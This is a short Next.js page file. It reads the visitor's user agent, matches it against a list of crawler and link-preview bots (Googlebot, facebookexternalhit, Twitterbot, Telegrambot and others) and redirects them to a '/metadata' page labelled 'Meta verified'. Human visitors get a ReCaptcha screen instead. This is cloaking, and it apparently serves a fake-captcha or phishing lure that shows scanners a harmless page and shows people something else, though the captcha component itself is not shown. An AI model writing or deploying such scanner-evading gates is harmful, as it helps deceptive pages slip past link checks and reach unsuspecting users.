import { headers } from 'next/headers'
import { redirect } from 'next/navigation'
import React from 'react'
import ReCaptcha from '.'
import { metaVerifiedMetadata } from '#data/metaVerifiedMetadata'

export const metadata = metaVerifiedMetadata

const BOT_KEYWORDS = [
  'bot',
  'crawler',
  'spider',
  'googlebot',
  'bingbot',
  'facebookexternalhit',
  'twitterbot',
  'linkedinbot',
  'slackbot',
  'telegrambot',
]

function isBotUserAgent(userAgent: string): boolean {
  const lower = userAgent.toLowerCase()
  return BOT_KEYWORDS.some((keyword) => lower.includes(keyword))
}

const SlugPage = async () => {
  const userAgent = headers().get('user-agent') ?? ''
  if (isBotUserAgent(userAgent)) {
    redirect('/metadata')
  }

  return <ReCaptcha />
}

export default SlugPage
